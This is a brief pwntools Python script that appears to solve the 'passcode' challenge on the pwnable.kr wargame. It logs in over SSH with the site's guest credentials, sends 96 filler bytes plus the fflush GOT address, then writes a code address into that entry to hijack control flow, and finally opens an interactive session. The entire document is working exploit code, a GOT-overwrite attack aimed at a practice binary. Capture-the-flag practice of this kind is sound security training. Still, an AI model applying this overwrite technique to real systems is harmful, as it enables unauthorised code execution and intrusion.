#!/usr/bin/env python3
from pwn import *

s = ssh(host = 'pwnable.kr', user = 'passcode', password = 'guest', port = 2222)
r = s.process('./passcode')

fflush_got = 0x804a004
target = 0x080485e3

payload = 'a'*96 + p32(fflush_got)


r.sendline(payload)
r.sendline(str(target))
r.interactive()
